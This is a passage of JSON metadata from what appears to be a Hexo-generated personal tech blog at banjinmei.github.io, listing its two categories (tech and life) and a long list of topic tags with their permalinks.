}","categories":[{"name":"生活","slug":"生活","permalink":"https://banjinmei.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[],"author":"mu"}],"categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"生活","slug":"生活","permalink":"https://banjinmei.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"ras","slug":"ras","permalink":"https://banjinmei.github.io/tags/ras/"},{"name":".net9","slug":"net9","permalink":"https://banjinmei.github.io/tags/net9/"},{"name":"vps","slug":"vps","permalink":"https://banjinmei.github.io/tags/vps/"},{"name":"vm","slug":"vm","permalink":"https://banjinmei.github.io/tags/vm/"},{"name":"win11","slug":"win11","permalink":"https://banjinmei.github.io/tags/win11/"},{"name":"debian","slug":"debian","permalink":"https://banjinmei.github.io/tags/debian/"},{"name":"iRedMail","slug":"iRedMail","permalink":"https://banjinmei.github.io/tags/iRedMail/"},{"name":"smtp","slug":"smtp","permalink":"https://banjinmei.github.io/tags/smtp/"},{"name":"HarmonryOS","slug":"HarmonryOS","permalink":"https://banjinmei.github.io/tags/HarmonryOS/"},{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"ArkTS","slug":"ArkTS","permalink":"https://banjinmei.github.io/tags/ArkTS/"},{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"},{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"},{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"llama","slug":"llama","permalink":"https://banjinmei.github.io/tags/llama/"},{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"gRPC","slug":"gRPC","permalink":"https://banjinmei.github.io/tags/gRPC/"},{"name":".net9.0","slug":"net9-0","permalink":"https://banjinmei.github.io/tags/net9-0/"},{"name":"Navigation","slug":"Navigation","permalink":"https://banjinmei.github.io/tags/Navigation/"},{"name":"nav","slug":"nav","permalink":"https://banjinmei.github.io/tags/nav/"},{"name":"jwt","slug":"jwt","permalink":"https://banjinmei.github.io/tags/jwt/"},{"name":"token","slug":"token","permalink":"https://banjinmei.github.io/tags/token/"},{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"},{"name":"opencv","slug":"opencv","permalink":"https://banjinmei.github.io/tags/opencv/"},{"name":"emgu","slug":"emgu","permalink":"https://banjinmei.github.io/tags/emgu/"},{"name":"uniapp","slug":"uniapp","permalink":"https://banjinmei.github.io/tags/uniapp/"},{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"},{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"},{"name":"jmeter","slug":"jmeter","permalink":"https://banjinmei.github.io/tags/jmeter/"},{"name":"jvav","slug":"jvav","permalink":"https://banjinmei.github.io/tags/jvav/"},{"name":"nigix","slug":"nigix","permalink":"https://banjinmei.github.io/tags/nigix/"},{"name":"keepalived","slug":"keepalived","permalink":"https://banjinmei.github.io/tags/keepalived/"},{"name":"inotify","slug":"inotify","permalink":"https://banjinmei.github.io/tags/inotify/"},{"name":"rsync","slug":"rsync","permalink":"https://banjinmei.github.io/tags/rsync/"},{"name":"postman","slug":"postman","permalink":"https://banjinmei.github.io/tags/postman/"},{"name":"XAI","slug":"XAI","permalink":"https://banjinmei.github.io/tags/XAI/"},{"name":"Grok","slug":"Grok","permalink":"https://banjinmei.github.io/tags/Grok/"},{"name":"canal","slug":"canal","permalink":"https://banjinmei.github.io/tags/canal/"},{"name":"swagger","slug":"swagger","permalink":"https://banjinmei.github.io/tags/swagger/"},{"name":"vue3","slug":"vue3","permalink":"https://banjinmei.github.io/tags/vue3/"},{"name":"weather","slug":"weather","permalink":"https://banjinmei.github.io/tags/weather/"},{"name":"IIS","slug":"IIS","permalink":"https://banjinmei.github.io/tags/IIS/"},{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"},{"name":"orm","slug":"orm","permalink":"https://banjinmei.github.io/tags/orm/"},{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"},{"name":"json","slug":"json","permalink":"https://banjinmei.github.io/tags/json/"},{"name":"chacha20","slug":"chacha20","permalink":"https://banjinmei.github.io/tags/chacha20/"},{"name":"LLM","slug":"LLM","permalink":"https://banjinmei.github.io/tags/LLM/"},{"name":"ollama","slug":"ollama","permalink":"https://banjinmei.github.io/tags/ollama/"},{"name":"docker","slug":"docker","permalink":"https://banjinmei.github.io/tags/docker/"},{"name":"gitea","slug":"gitea","permalink":"https://banjinmei.github.io/tags/gitea/"},{"name":"gitlab","slug":"gitlab","permalink":"https://banjinmei.github.io/tags/gitlab/"},{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"},{"name":"npm","slug":"npm","permalink":"https://banjinmei.github.io/tags/npm/"},{"name":"mac","slug":"mac","permalink":"https://banjinmei.github.io/tags/mac/"},{"name":"recover","slug":"recover","permalink":"https://banjinmei.github.io/tags/recover/"},{"name":"roacle","slug":"roacle","permalink":"https://banjinmei.github.io/tags/roacle/"},{"name":"ase","slug":"ase","permalink":"https://banjinmei.github.io/tags/ase/"},{"name":"jquery","slug":"jquery","permalink":"https://banjinmei.github.io/tags/jquery/"},{"name":"qrcode","slug":"qrcode","permalink":"https://banjinmei.github.io/tags/qrcode/"},{"name":"electron","slug":"electron","permalink":"https://banjinmei.github.io/tags/electron/"},{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"},{"name":"anolis","slug":"anolis","permalink":"https://banjinmei.github.io/tags/anolis/"},{"name":"koa","slug":"koa","permalink":"https://banjinmei.github.io/tags/koa/"},{"name":"rabbitmq","slug":"rabbitmq","permalink":"https://banjinmei.github.io/tags/rabbitmq/"},{"name":"git","slug":"git","permalink":"https://banjinmei.github.io/tags/git/"},{"name":"mssql","slug":"mssql","permalink":"https://banjinmei.github.io/tags/mssql/"},{"name":"Hologres","slug":"Hologres","permalink":"https://banjinmei.github.io/tags/Hologres/"},{"name":"postgresql","slug":"postgresql","permalink":"https://banjinmei.github.io/tags/postgresql/"},{"name":"SD","slug":"SD","permalink":"https://banjinmei.github.io/tags/SD/"},{"name":"it","slug":"it","permalink":"https://banjinmei.github.io/tags/it/"},{"name":"email","slug":"email","permalink":"https://banjinmei.github.io/tags/email/"},{"name":"nohup","slug":"nohup","permalink":"https://banjinmei.github.io/tags/nohup/"},{"name":"console","slug":"console","permalink":"https://banjinmei.github.io/tags/console/"},{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"},{"name":"aaxios","slug":"aaxios","permalink":"https://banjinmei.github.io/tags/aaxios/"},{"name":"cors","slug":"cors","permalink":"https://banjinmei.github.io/tags/cors/"},{"name":"timestamp","slug":"timestamp","permalink":"https://banjinmei.github.io/tags/timestamp/"},{"name":"yolo","slug":"yolo","permalink":"https://banjinmei.github.io/tags/yolo/"},{"name":"VUE","slug":"VUE","permalink":"https://banjinmei.github.io/tags/VUE/"},{"name":"yarn","slug":"yarn","permalink":"https://banjinmei.github.io/tags/yarn/"},{"name":"Nginx","slug":"Nginx","permalink":"https://banjinmei.github.io/tags/Nginx/"},{"name":"Docker","slug":"Docker","permalink":"https://banjinmei.github.io/tags/Docker/"},{"name":"Linux","slug":"Linux","permalink":"https://banjinmei.github.io/tags/Linux/"},{"name":"Debian","slug":"Debian","permalink":"https://banjinmei.github.io/tags/Debian/"},{"name":"VM","slug":"VM","permalink":"https://banjinmei.github.io/tags/VM/"},{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"},{"name":"WorldTime","slug":"WorldTime","permalink":"https://banjinmei.github.io/tags/WorldTime/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"},{"name":"JSON","slug":"JSON","permalink":"https://banjinmei.github.io/tags/JSON/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"AzureAI","slug":"AzureAI","permalink":"https://banjinmei.github.io/tags/AzureAI/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"},{"name":"Dockerhub","slug":"Dockerhub","permalink":"https://banjinmei.github.io/tags/Dockerhub/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://banjinmei.github.io/tags/RocketMQ/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"},{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"Typescript","slug":"Typescript","permalink":"https://banjinmei.github.io/tags/Typescript/"},{"name":"datatype","slug":"datatype","permalink":"https://banjinmei.github.io/tags/datatype/"},{"name":"interface","slug":"interface","permalink":"https://banjinmei.github.io/tags/interface/"},{"name":"type","slug":"type","permalink":"https://banjinmei.github.io/tags/type/"},{"name":"T","slug":"T","permalink":"https://banjinmei.github.io/tags/T/"},{"name":"extends","slug":"extends","permalink":"https://banjinmei.github.io/tags/extends/"},{"name":"class","slug":"class","permalink":"https://banjinmei.github.io/tags/class/"},{"name":"abstract","slug":"abstract","permalink":"https://banjinmei.github.io/tags/abstract/"},{"name":"implements","slug":"implements","permalink":"https://banjinmei.github.io/tags/implements/"},{"name":".netS","slug":"netS","permalink":"https://banjinmei.github.io/tags/netS/"},{"name":"Node.js","slug":"Node-js","permalink":"https://banjinmei.github.io/tags/Node-js/"},{"name":"util","slug":"util","permalink":"https://banjinmei.github.io/tags/util/"},{"name":"file","slug":"file","permalink":"https://banjinmei.github.io/tags/file/"},{"name":"getpost","slug":"getpost","permalink":"https://banjinmei.github.io/tags/getpost/"},{"name":"web","slug":"web","permalink":"https://banjinmei.github.io/tags/web/"},{"name":"express","slug":"express","permalink":"https://banjinmei.github.io/tags/express/"},{"name":"child_process","slug":"child-process","permalink":"https://banjinmei.github.io/tags/child-process/"},{"name":"mogodb","slug":"mogodb","permalink":"https://banjinmei.github.io/tags/mogodb/"},{"name":"event","slug":"event","permalink":"https://banjinmei.github.io/tags/event/"},{"name":"buffer","slug":"buffer","permalink":"https://banjinmei.github.io/tags/buffer/"},{"name":"stream","slug":"stream","permalink":"https://banjinmei.github.io/tags/stream/"},{"name":"c++","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"router","slug":"router","permalink":"https://banjinmei.github.io/tags/router/"},{"name":"AES","slug":"AES","permalink":"https://banjinmei.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://banjinmei.github.io/tags/DES/"},{"name":"IOD","slug":"IOD","permalink":"https://banjinmei.github.io/tags/IOD/"},{"name":"POD","slug":"POD","permalink":"https://banjinmei.github.io/tags/POD/"},{"name":"webp","slug":"webp","permalink":"https://banjinmei.github.io/tags/webp/"},{"name":"AOT","slug":"AOT","permalink":"https://banjinmei.github.io/tags/AOT/"},{"name":"spider","slug":"spider","permalink":"https://banjinmei.github.io/tags/spider/"},{"name":"Avalonia","slug":"Avalonia","permalink":"https://banjinmei.github.io/tags/Avalonia/"},{"name":"JWT","slug":"JWT","permalink":"https://banjinmei.github.io/tags/JWT/"},{"name":"i18n","slug":"i18n","permalink":"https://banjinmei.github.io/tags/i18n/"},{"name":"Reids","slug":"Reids","permalink":"https://banjinmei.github.io/tags/Reids/"},{"name":"SignalR","slug":"SignalR","permalink":"https://banjinmei.github.io/tags/SignalR/"},{"name":"Swagger","slug":"Swagger","permalink":"https://banjinmei.github.io/tags/Swagger/"}]}